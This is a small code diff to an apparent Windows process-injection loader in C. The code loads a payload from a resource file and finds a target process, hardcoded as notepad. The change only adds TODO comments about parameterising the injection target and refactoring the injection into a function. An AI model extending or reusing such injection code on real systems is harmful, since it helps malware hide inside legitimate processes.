@@ -33,7 +33,9 @@ int getResoucePayload(OUT PVOID* ppPayloadAddress, OUT SIZE_T* psPayloadSize) {
 }
 
 int getRemoteProcessHandle(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
-	
+	// TODO: desired injection process as parameter instead of hardcoded notepad
+
+
 	// Get process listing snapshot
 	HANDLE hSnapShot = NULL;
 	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
@@ -73,6 +75,8 @@ int getRemoteProcessHandle(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
 }
 
 int main() {
+	// TODO: Move injection to a function
+
 	// Get payload from resource file
 	PVOID		pPayloadAddress = NULL;
 	SIZE_T		sPayloadSize = NULL;
